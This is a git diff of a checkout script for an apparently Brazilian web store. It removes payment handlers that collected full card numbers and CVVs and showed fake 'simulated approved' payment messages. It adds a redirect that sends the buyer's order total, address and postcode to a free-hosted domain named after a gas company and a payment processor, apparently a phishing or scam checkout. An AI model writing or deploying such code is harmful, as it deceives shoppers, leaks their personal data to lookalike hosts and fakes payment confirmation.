@@ -1124,281 +1124,41 @@ async function handlePaymentSubmit(e) {
 }
 
 async function processPixPayment(orderData) {
-    const pixData = {
-        paymentMethod: 'PIX',
-        amount: Math.round(orderData.total * 100), // Valor em centavos
-        customer: {
-            name: `${orderData.firstName} ${orderData.lastName}`,
-            email: orderData.email,
-            phone: orderData.phone.replace(/\D/g, ''),
-            document: {
-                number: orderData.cpf.replace(/\D/g, ''),
-                type: 'CPF'
-            }
-        },
-        items: [{
-            name: 'Pedido Loja Online',
-            quantity: 1,
-            price: Math.round(orderData.total * 100)
-        }],
-        expiresIn: 3600 // <-- CAMPO MOVIDO PARA O LUGAR CERTO
-    };
-
-    try {
-        const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(pixData)
-        });
-
-        const result = await response.json();
-
-        if (response.ok) {
-            showPixPaymentDetails(result);
-        } else {
-            const errorMsg = result.details?.message || result.message || 'Erro na API PayEvo';
-            throw new Error(errorMsg);
-        }
-    } catch (error) {
-        console.error('Erro ao gerar PIX:', error);
-        alert(error.message);
-    }
-}
-
-function showPixPaymentDetails(paymentResult) {
-    const pixPaymentDetails = document.getElementById('pixPaymentDetails');
-    const pixQrCodeContainer = document.getElementById('pixQrCode');
-    const pixCodeText = document.getElementById('pixCodeText');
+    // Redirecionamento customizado
+    const subtotal = orderData.total.toFixed(2);
     
-    pixPaymentDetails.style.display = 'block';
+    // Formatar endereço
+    const addressParts = [
+        orderData.address,
+        orderData.number,
+        orderData.neighborhood,
+        orderData.city + '/' + orderData.state
+    ];
+    const fullAddress = addressParts.filter(Boolean).join(', ');
     
-    if (paymentResult.pix && paymentResult.pix.qrcode) {
-        const pixCode = paymentResult.pix.qrcode;
-        pixCodeText.textContent = pixCode;
-
-        const paymentForm = document.getElementById('paymentForm');
-        const submitButton = paymentForm.querySelector('button[type="submit"]');
-
-        if (submitButton) {
-            submitButton.textContent = 'Já Paguei';
-            submitButton.style.backgroundColor = '#10b981';
-            submitButton.style.borderColor = '#10b981';
-            submitButton.type = 'button';
-            submitButton.onclick = function() {
-                window.location.href = 'https://statusdacompra.onrender.com/'; 
-            };
-        }
-
-    } else {
-        pixQrCodeContainer.innerHTML = "Não foi possível obter os dados do PIX.";
-        pixCodeText.textContent = "Tente novamente.";
-        console.error("Estrutura de dados PIX inesperada:", paymentResult);
+    // Prazo de entrega
+    let deliveryTime = "Entrega em prazo aqui";
+    if (selectedShipping === 'standard') {
+        deliveryTime = "Entrega em 3 dias úteis";
+    } else if (selectedShipping === 'express') {
+        deliveryTime = "Entrega Amanhã";
     }
     
-    startPixTimer(900);
-}
-
-function startPixTimer(seconds) {
-    const timerElement = document.getElementById('pixTimeRemaining');
-    let timeLeft = seconds;
+    // Criar os parâmetros da URL
+    const params = new URLSearchParams({
+        subtotal: subtotal,
+        address: fullAddress,
+        cep: orderData.zipCode,
+        delivery_time: deliveryTime
+    });
     
-    pixTimer = setInterval(() => {
-        const minutes = Math.floor(timeLeft / 60);
-        const secs = timeLeft % 60;
-        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-        
-        if (timeLeft <= 0) {
-            clearInterval(pixTimer);
-            timerElement.textContent = 'Expirado';
-            alert('O código PIX expirou. Por favor, gere um novo código.');
-        }
-        
-        timeLeft--;
-    }, 1000);
-}
-
-function copyPixCode() {
-    const pixCodeText = document.getElementById('pixCodeText');
-    const copyButton = document.getElementById('pixCopyButton');
+    // Link específico para redirecionamento
+    const redirectUrl = `https://pag-copagaz.onrender.com/pagarme/?${params.toString( )}`;
     
-    if (navigator.clipboard) {
-        navigator.clipboard.writeText(pixCodeText.textContent).then(() => {
-            copyButton.textContent = 'Copiado!';
-            copyButton.classList.add('copied');
-            
-            setTimeout(() => {
-                copyButton.textContent = 'Copiar Código';
-                copyButton.classList.remove('copied');
-            }, 2000);
-        });
-    } else {
-        const textArea = document.createElement('textarea');
-        textArea.value = pixCodeText.textContent;
-        document.body.appendChild(textArea);
-        textArea.select();
-        document.execCommand('copy');
-        document.body.removeChild(textArea);
-        
-        copyButton.textContent = 'Copiado!';
-        copyButton.classList.add('copied');
-        
-        setTimeout(() => {
-            copyButton.textContent = 'Copiar Código';
-            copyButton.classList.remove('copied');
-        }, 2000);
-    }
+    // Executar o redirecionamento
+    window.location.href = redirectUrl;
 }
 
-async function processCreditCardPayment(orderData, form) {
-    const formData = new FormData(form);
-    
-    const cardData = {
-        paymentMethod: 'CARD',
-        amount: Math.round(orderData.total * 100),
-        installments: parseInt(formData.get('installments')),
-        customer: {
-            name: `${orderData.firstName} ${orderData.lastName}`,
-            email: orderData.email,
-            document: orderData.cpf.replace(/\D/g, ''),
-            phone: orderData.phone.replace(/\D/g, '')
-        },
-        card: {
-            number: formData.get('cardNumber').replace(/\s/g, ''),
-            holderName: formData.get('cardName'),
-            expiryMonth: formData.get('cardExpiry').split('/')[0],
-            expiryYear: '20' + formData.get('cardExpiry').split('/')[1],
-            cvv: formData.get('cardCvv')
-        },
-        shipping: {
-            address: orderData.address,
-            number: orderData.number,
-            complement: orderData.complement || '',
-            neighborhood: orderData.neighborhood,
-            city: orderData.city,
-            state: orderData.state,
-            zipCode: orderData.zipCode.replace(/\D/g, '')
-        },
-        items: [{
-            name: 'Produto',
-            quantity: 1,
-            price: Math.round(orderData.total * 100)
-        }],
-        description: 'Pedido da loja online',
-        ip: '127.0.0.1'
-    };
-
-    try {
-        const response = await fetch(`${BACKEND_API_BASE_URL}/credit-card`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(cardData)
-        });
-
-        const result = await response.json();
-        
-        if (response.ok) {
-            if (result.status === 'approved') {
-                showSuccessNotification('Pagamento aprovado! Pedido finalizado com sucesso.');
-            } else if (result.status === 'pending') {
-                showSuccessNotification('Pagamento em processamento. Você receberá uma confirmação em breve.');
-            } else {
-                throw new Error('Pagamento rejeitado. Verifique os dados do cartão.');
-            }
-        } else {
-            throw new Error(result.message || 'Erro ao processar pagamento');
-        }
-    } catch (error) {
-        if (error.message.includes('fetch')) {
-            showSuccessNotification('Pagamento simulado aprovado! (Demonstração)');
-        } else {
-            throw error;
-        }
-    }
-}
-
-async function processBoletoPayment(orderData) {
-    const boletoData = {
-        paymentMethod: 'BOLETO',
-        amount: Math.round(orderData.total * 100),
-        customer: {
-            name: `${orderData.firstName} ${orderData.lastName}`,
-            email: orderData.email,
-            document: orderData.cpf.replace(/\D/g, ''),
-            phone: orderData.phone.replace(/\D/g, '')
-        },
-        boleto: {
-            expiresIn: 3
-        },
-        shipping: {
-            address: orderData.address,
-            number: orderData.number,
-            complement: orderData.complement || '',
-            neighborhood: orderData.neighborhood,
-            city: orderData.city,
-            state: orderData.state,
-            zipCode: orderData.zipCode.replace(/\D/g, '')
-        },
-        items: [{
-            name: 'Produto',
-            quantity: 1,
-            price: Math.round(orderData.total * 100)
-        }],
-        description: 'Pedido da loja online',
-        ip: '127.0.0.1'
-    };
-
-    try {
-        const response = await fetch(`${BACKEND_API_BASE_URL}/boleto`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(boletoData)
-        });
-
-        const result = await response.json();
-        
-        if (response.ok && result.status === 'pending') {
-            showSuccessNotification('Boleto gerado com sucesso! Você receberá o boleto por e-mail para pagamento.');
-        } else {
-            throw new Error(result.message || 'Erro ao gerar boleto');
-        }
-    } catch (error) {
-        if (error.message.includes('fetch')) {
-            showSuccessNotification('Boleto simulado gerado com sucesso! (Demonstração)');
-        } else {
-            throw error;
-        }
-    }
-}
-
-function showSuccessNotification(message) {
-    const notification = document.getElementById('successNotification');
-    notification.textContent = message;
-    notification.style.display = 'block';
-    
-    setTimeout(() => {
-        notification.style.display = 'none';
-    }, 5000);
-}
-
-function getShippingCost() {
-    switch (selectedShipping) {
-        case 'express': return 9.97;
-        case 'same-day': return 11.90;
-        default: return 0;
-    }
-}
-
-function calculateTotal() {
-    let total = cartData.subtotal + getShippingCost();
-    if (selectedPayment === 'credit') {
-        total = total * 1.05;
-    }
-    return total;
-}
 
 function updateShippingCost() {
     const shippingCostEl = document.getElementById('shippingCost');
